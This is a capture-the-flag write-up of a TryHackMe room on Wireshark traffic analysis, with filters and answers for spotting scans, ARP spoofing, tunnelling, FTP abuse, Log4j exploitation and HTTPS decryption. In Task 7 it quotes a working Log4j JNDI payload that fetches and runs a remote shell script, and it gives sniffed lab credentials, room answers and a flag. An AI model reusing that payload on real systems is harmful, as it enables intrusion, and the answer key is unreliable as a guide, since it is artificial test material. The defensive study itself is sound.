## introduction
Learn the basics of traffic analysis with Wireshark and how to find anomalies on your network!

Link: https://tryhackme.com/room/wiresharkpacketoperations

In this room, we will cover the techniques and key points of traffic analysis with Wireshark and detect suspicious activities.
# Task 2:Nmap Scans 
Use the “Desktop/exercise-pcaps/nmap/Exercise.pcapng” file.
What is the total number of the “TCP Connect” scans?
**Ans:100**

**the filter**: **tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.window_size > 1024** 

<img width="700" height="500" alt="aa" src="https://github.com/user-attachments/assets/f5472c31-5b61-44de-97f6-d6d446fa091b" />.

Which scan type is used to scan the TCP port 80?

**Ans:** TCP Connect

**the filter**:tcp.port == 80

<img width="1036" height="412" alt="1" src="https://github.com/user-attachments/assets/69e0446c-ddd2-4a52-ae9b-e0a87e3608fd" />
How many “UDP close port” messages are there?

**Ans: 1083**

**icmp.type == 3 and icmp.code == 3**

<img width="1024" height="600" alt="2" src="https://github.com/user-attachments/assets/df6d47cb-a9ed-48bc-a9e3-1db2d2000e90" />

“icmp.type == 3”: This filter matches ICMP packets based on the ICMP type field. ICMP type 3 represents the Destination Unreachable message.

“icmp.code == 3”: This filter matches ICMP packets based on the ICMP code field. ICMP code 3 is a specific code value within the Destination Unreachable message type.

Which UDP port in the 55–70 port range is open?

**Ans: 68**

**udp.dstport >= 50 and udp.port  <= 70**

<img width="1024" height="600" alt="image" src="https://github.com/user-attachments/assets/f590a27a-a432-43c8-bf7b-54b35e1ba211" />

After filtering out destination ports between 50 and 70, there are fourt ports identified that use udp. But if we analyze the packet details of each icmp packets with a“Destination unreachable”, we will identify that ports 67, 53, and 69 are not open.

Fore example in the second image, the first ICMP error uses the original request from 10.10.60.7:67. The same would be said of the other ICMP errors.

## Task 3: ARP Poisoning & Man In The Middle!
Use the “Desktop/exercise-pcaps/arp/Exercise.pcapng” file.
**What is the number of ARP requests crafted by the attacker?**

**Ans: 284**

We first need to identify who the attacker is.

**arp.duplicate-address-detected or arp.duplicate-address-frame**

<img width="1024" height="600" alt="image" src="https://github.com/user-attachments/assets/6144f02c-0ec6-4205-b1e1-5ee286d26f20" />

We have identified that the attacker has a mac address of **“00:0c:29:e2:18:b4"**

Let’s now craft a query to filter all ARP requests from the MAC address of the attacker.

**arp.opcode == 1 and arp.src.hw_mac == 00:0c:29:e2:18:b4**

<img width="1024" height="600" alt="image" src="https://github.com/user-attachments/assets/69294adf-8f01-4f9f-a1eb-5ed8b391323c" />
What is the number of HTTP packets received by the attacker?

**Ans: 90**

We will modify the query to filter all http packets received by the attacker.

**http and eth.addr == 00:0c:29:e2:18:b4**

<img width="1024" height="600" alt="image" src="https://github.com/user-attachments/assets/018db4fa-a38e-4863-a760-a62481af9473" />

If we use the IP address of the attacker, no packets will be displayed. However, if we use the spoofed address, we will see some packets.

<img width="1024" height="600" alt="image" src="https://github.com/user-attachments/assets/814034d8-4f79-4641-a856-e6669c467859" />

What is the number of sniffed username&password entries?

**Ans: 6**

We first need to identify the login points or URL for authentication.

**http and eth.addr == 00:0c:29:e2:18:b4**

We see that the attacker sent a “GET” request to a login page. In the packet details under HTTP, we see the host name hosting the login page. We will apply that as filter.

<img width="1024" height="600" alt="image" src="https://github.com/user-attachments/assets/6a628aa9-099c-4ca1-a0cb-0f416ea74ffc" />

We will modify the query to filter only “POST” request. We get ten packets.

<img width="1024" height="600" alt="image" src="https://github.com/user-attachments/assets/4d8d9c0e-421c-4e5c-aaea-b4e2b3d93b2a" />

Go through all the packets, and some will contain credentials in the Packet details under the HTML Form URL endoded section. Below is an example.

<img width="1024" height="600" alt="image" src="https://github.com/user-attachments/assets/9780bda2-4aff-4f13-8c58-106cea7a7b99" />

I realized soon after I answered the last two questions below that we can modify the filter used to matched any value in that field, excluding empty strings.

**urlencoded-form matches ".+"**

<img width="1024" height="600" alt="image" src="https://github.com/user-attachments/assets/94798bf0-1dc1-4c48-bc3f-c1b4261a646f" />

What is the password of the “Client986”?

**Ans: clientnothere!**

From the previous packet, we know that data was captured in the HTML Form URL Encoded section. The Display Filter Expression will help us create a filter that is acceptable to wireshark.

**urlencoded-form matches "client986"**

<img width="1024" height="600" alt="image" src="https://github.com/user-attachments/assets/17cfe6d4-913e-4c3a-a892-ac0a2d69ce5a" />

What is the comment provided by the “Client354”?

**Ans: Nice work!**

Same concept as the previous question. Any comments in the hostname might have been captured.

**urlencoded-form matches "client354"**

<img width="1024" height="450" alt="image" src="https://github.com/user-attachments/assets/22cfe5c4-acde-44dd-8abb-010fcc672a3e" />

## Task 4: Identifying Hosts: DHCP, NetBIOS and Kerberos

Use the “Desktop/exercise-pcaps/dhcp-netbios-kerberos/dhcp-netbios.pcap” file.
What is the MAC address of the host “Galaxy A30”?

**Ans: 9a:81:41:cb:96:6c**

**dhcp.option.hostname contains "A30"**

<img width="993" height="891" alt="image" src="https://github.com/user-attachments/assets/ebe46d76-7375-46de-a7ef-dc197946abd8" />

How many NetBIOS registration requests does the “LIVALJM” workstation have?

**Ans: 16**

Let’s create a query using the Display Filter Expression. The first one is building an NBNS registration request filter, and the second one is filtering NBNS names that match only the workstation “LIVALJM”

<img width="993" height="1060" alt="image" src="https://github.com/user-attachments/assets/4cfa8aef-189d-471f-b889-dee91dd6ea0f" />

<img width="993" height="1060" alt="image" src="https://github.com/user-attachments/assets/e223c29f-f8e0-47bb-b355-4cc0f60f3b9a" />

<img width="1024" height="552" alt="image" src="https://github.com/user-attachments/assets/66f6258a-7180-49fb-aac9-4fea127bdf86" />

Which host requested the IP address “172.16.13.85”?

**Ans: Galaxy-A12**

**dhcp.option.dhcp == 3 && dhcp.option.requested_ip_address == 172.16.13.85**

<img width="993" height="204" alt="image" src="https://github.com/user-attachments/assets/687547ba-1adc-46b8-9208-956a34cc0190" />

If the Host Name column is not diplayed as a column, go to the Packet List and right-click to add column for the host name. Otherwise, search for the host name within the DHCP Packet details pane.

<img width="993" height="438" alt="image" src="https://github.com/user-attachments/assets/53e04535-b254-49ef-b8ab-b47a1e7e5f60" />

Use the “Desktop/exercise-pcaps/dhcp-netbios-kerberos/kerberos.pcap” file.
What is the IP address of the user “u5”? (Enter the address in defanged format.)

**Ans: 10[.]1[.]12[.]2**

**kerberos.CNameString contains "u5"**

<img width="1024" height="552" alt="image" src="https://github.com/user-attachments/assets/2aac920a-99b0-4e70-b49f-87dae3328303" />

Defang the IP address uding cyberchef.

<img width="803" height="319" alt="image" src="https://github.com/user-attachments/assets/ce8584c6-1a97-4ce8-bcdf-1fa1d4c0fbe7" />

What is the hostname of the available host in the Kerberos packets?

**Ans: xp1$**

**kerberos.CNameString contains "$"**

<img width="1024" height="552" alt="image" src="https://github.com/user-attachments/assets/49872e6f-5fea-4e62-b4e2-8799d0ab01f0" />

Values that end with “$” are hostnames, and the ones without it are usernames.

## Task 5: Tunneling Traffic: DNS and ICMP

Use the “Desktop/exercise-pcaps/dns-icmp/icmp-tunnel.pcap” file.
Investigate the anomalous packets. Which protocol is used in ICMP tunnelling?

**Ans: SSH**

**data.len > 64 and icmp**

<img width="1024" height="552" alt="image" src="https://github.com/user-attachments/assets/69b88dad-8fef-4e16-8e19-d2caf7800c02" />

The result does not have enough data for us to analyze.

So we will modify the query to include the protocols commonly used for data exfiltration such as SSH, FTP, TCP, and HTTP.

**(data.len > 64) and (icmp contains "ssh" or icmp contains "ftp" or icmp contains "tcp" or icmp contains "http")**

<img width="1024" height="552" alt="image" src="https://github.com/user-attachments/assets/b24ace95-eed8-477f-b8a9-1b526917bb09" />

We got three results. Inpect one of the packets and focus on the packet bytes pane.

<img width="1024" height="738" alt="image" src="https://github.com/user-attachments/assets/af4ce42d-4659-44ce-bb22-0c2dc70c953e" />

Use the “Desktop/exercise-pcaps/dns-icmp/dns.pcap” file.
Investigate the anomalous packets. What is the suspicious main domain address that receives anomalous DNS queries? (Enter the address in defanged format.)

**Ans: dataexfil[.]com**

**dns.qry.name.len > 15 and !mdns** 

<img width="1024" height="700" alt="image" src="https://github.com/user-attachments/assets/62b8a8a0-dc60-4496-bbfb-470c160d8f2e" />

We got over 30,000 packets. Imagine going over each one individually

I modified the query and increased the query name length to 40 to look for DNS names with particularly long lngths, which is highly suspicious for a normal DNS name.

**dns.qry.name.len > 40 and !mdns**

<img width="1024" height="640" alt="image" src="https://github.com/user-attachments/assets/f79f95af-0098-4c28-a52d-3c6a878657bb" />

We can also use the following query or modify it if we are looking for a specific top-level domain such as “.com”

**dns.qry.name.len > 40 and !mdns && dns.qry.name contains ".com"**

## Task 6: Cleartext Protocol Analysis: FTP
Use the “Desktop/exercise-pcaps/ftp/ftp.pcap” file.
How many incorrect login attempts are there?

**Ans: 737**

**ftp.response.code == 530**

<img width="1024" height="552" alt="image" src="https://github.com/user-attachments/assets/ad0f2f6a-9846-4c33-89ec-079c8f8fd7f8" />

What is the size of the file accessed by the “ftp” account?

**Ans: 39424**

**ftp.response.code == 213**

<img width="1024" height="450" alt="image" src="https://github.com/user-attachments/assets/71af4bec-e459-487e-af2f-c0964008fb4b" />

The ftp.response.code of 213 provides information about the status or size of a downloaded file. The “arg” value contains the readable strings that include file size in bytes.

The adversary uploaded a document to the FTP server. What is the filename?

**Ans: resume.doc**

**ftp.request.command == "RETR"**

<img width="1024" height="450" alt="image" src="https://github.com/user-attachments/assets/4382b8fe-b113-435c-811c-181a6186e179" />

The FTP command “RETR” is used to retrieve (or download) files or documents from the FTP server to our local system.

Not sure if the question meant to ask about uploading documents to the FTP server because the ftp command for that is “STOR” and the uploaded file was different.

<img width="1024" height="450" alt="image" src="https://github.com/user-attachments/assets/80bddf96-e761-42f9-aefa-4db7ac4afab6" />

The adversary tried to assign special flags to change the executing permissions of the uploaded file. What is the command used by the adversary?

**Ans: CHMOD 777**

**ftp contains "CHMOD"**

<img width="1024" height="450" alt="image" src="https://github.com/user-attachments/assets/ebe1dc84-178e-4dea-b1e8-dcc711607a42" />

“CHMOD” is a terminal command used for modifying file permissions using numeric or symbolic representation.

## Task 7: Cleartext Protocol Analysis: HTTP
Use the “Desktop/exercise-pcaps/http/user-agent.cap” file.

Investigate the user agents. What is the number of anomalous “user-agent” types?

**Ans: 6**

**http.user_agent**

<img width="982" height="891" alt="image" src="https://github.com/user-attachments/assets/b0619997-52d2-491c-bd46-ca284340bb92" />

Filter packets with HTTP user-agent. Select one of the packets and apply the “User-Agent” info as a column. We have to go through each of the “User-Agent” columns and idenify the legitimate and elligitimate ones.

The hint actually gave us the first user-agent.

Mozilla/5.0 (Windows; U; Windows NT 6.4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10
Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
Wfuzz/2.4
sqlmap/1.4#stable (http://sqlmap.org)
${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0

**What is the packet number with a subtle spelling difference in the user agent field?**

**Ans: 52**

<img width="982" height="108" alt="image" src="https://github.com/user-attachments/assets/de3c2609-87fc-47bd-a4f3-90f6fa8d5945" />

This is a needle in a hay stack because at first glance, nothing seems suspicious.

**Use the “Desktop/exercise-pcaps/http/http.pcapng” file.
Locate the “Log4j” attack starting phase. What is the packet number?**

**Ans: 444**

With this task, we will be able to answer the last two questions.

 (http.user_agent contains "$") or (http.user_agent contains "==")

<img width="982" height="573" alt="image" src="https://github.com/user-attachments/assets/662b663d-f821-432f-8293-eb525c216a45" />

<img width="982" height="108" alt="image" src="https://github.com/user-attachments/assets/ad6e9a66-91b4-45ce-ac4a-4110f72c3eb0" />

Copy the value of the User-Agent then decode it from base 64 using cyberchef.

<img width="982" height="263" alt="image" src="https://github.com/user-attachments/assets/364d069b-4d8e-4e31-8660-96a6238647ec" />

This is the attack starting phase as seen from the decoded command. The command “wget” would retreive the bash script “lh.sh” from the hosting address, then change the file’s permission to executable, then eventually executing the malicious file.

**Locate the “Log4j” attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude “{}”.)**

**Ans: 62[.]210[.]130[.]250**

## Task 8: Encrypted Protocol Analysis: Decrypting HTTPS
Use the “Desktop/exercise-pcaps/https/Exercise.pcap” file.

**What is the frame number of the “Client Hello” message sent to “accounts.google.com”?**

**Ans: 16**

**(http.request or tls.handshake.type == 1) and !(ssdp)** 

<img width="1024" height="700" alt="image" src="https://github.com/user-attachments/assets/25ecc017-e2a1-407c-a622-132f5a076535" />

“tls.handshake.type == 1” filters TLS requests sent by a client to a server.

**Decrypt the traffic with the “KeysLogFile.txt” file. What is the number of HTTP2 packets?**

**Ans: 115**

Adding the key log file: “Edit → Preferences → Protocols → TLS” menu. Then filter only http2 packets.

<img width="1024" height="700" alt="image" src="https://github.com/user-attachments/assets/36655460-7b68-4a5b-b2d8-229487568a8c" />

<img width="1024" height="614" alt="image" src="https://github.com/user-attachments/assets/c4daaded-4c4c-40e3-8b42-9aacbe8dab89" />

**Go to Frame 322. What is the authority header of the HTTP2 packet? (Enter the address in defanged format.)**

**Ans: safebrowsing[.]googleapis[.]com**

Press ctrl+g and go to packet 322.

<img width="1024" height="700" alt="image" src="https://github.com/user-attachments/assets/4be3808e-5798-4e8f-af60-15dad688a86c" />

In the packet details pane, we see the header authority. Defang the address in cyberchef.

<img width="982" height="391" alt="image" src="https://github.com/user-attachments/assets/3701c8b8-13b8-4f0e-a8c8-11b71609d9d9" />

**Investigate the decrypted packets and find the flag! What is the flag?**

**Ans: FLAG{THM-PACKETMASTER}**

In the export HTTP object list window, there are two files, and one of which is kind of suspicious. So let’s go to the packet number and see what it is.

<img width="982" height="153" alt="image" src="https://github.com/user-attachments/assets/c7735909-58f1-4bb8-985d-5d45d29fd86c" />

<img width="982" height="391" alt="image" src="https://github.com/user-attachments/assets/61437c76-7d97-4f22-beee-df6cbb58a78f" />

The flag can be seen in the Line-based text data section of the packet details pane.

## Task 9 Bonus: Hunt Cleartext Credentials!
Use the “Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap” file.

**What is the packet number of the credentials using “HTTP Basic Auth”?**

**Ans: 237**

<img width="982" height="191" alt="image" src="https://github.com/user-attachments/assets/f346624b-91f6-42bb-a3ed-3d7765a5cd81" />

<img width="1024" height="542" alt="image" src="https://github.com/user-attachments/assets/0b1cac41-2a12-4301-a9a3-ac568d77137d" />

**What is the packet number where “empty password” was submitted?**

**Ans: 170**

<img width="1024" height="640" alt="image" src="https://github.com/user-attachments/assets/d463de6d-7fb2-43dc-a091-1b0d933e784f" />

If we click on the packet number in the credentials window, wireshark directs us to the packet as seen from the image above.

Browse through the packets. Packet 170 has no value in the Request arg.

<img width="1024" height="520" alt="image" src="https://github.com/user-attachments/assets/8a7a73ab-7c39-4554-be9e-0ba1ec85c84f" />

Another way to look for empty credentials submission for FTP packets is to select one of the packets where authentication is being requested. Select the “Request command: PASS” from the packet details, then left-click it and drag all the way to the display filter, or simply by right-clicking and applying it as a display filter.

<img width="1024" height="524" alt="image" src="https://github.com/user-attachments/assets/23bbc116-0ca2-499c-b98f-4b55026d28df" />

<img width="1024" height="550" alt="image" src="https://github.com/user-attachments/assets/e3033d30-4a2a-44ec-813f-447e8a1389b3" />

The result will display all ftp packets that requested for a “PASS” command in the authentication.

## Task 10 Bonus: Actionable Results!
Use the “Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap” file.

Create firewall rules by using “Tools → Firewall ACL Rules”

**Select packet number 99. Create a rule for “IPFirewall (ipfw)”. What is the rule for “denying source IPv4 address”?**

Change the rules for “IPFirewall(ipfw)”

<img width="1024" height="724" alt="image" src="https://github.com/user-attachments/assets/9e2c1956-c531-4c6a-a0e8-0786a47afe80" />

**Ans: add deny ip from 10.121.70.151 to any in**

**Select packet number 231. Create “IPFirewall” rules. What is the rule for “allowing destination MAC address”?**

**Ans: add allow MAC 00:d0:59:aa:af:80 any in**

Unselect Deny.

<img width="1024" height="724" alt="image" src="https://github.com/user-attachments/assets/2dcd09f5-c7d4-4910-87b4-a47436f85f08" />

## disclaimer 
Attribution
A huge credit to igor_sec for creating the original documentation featured in this repository!

I have completed this learning path myself and am sharing these materials here as evidence of my course completion and to track my personal learning journey.

thanks for reading
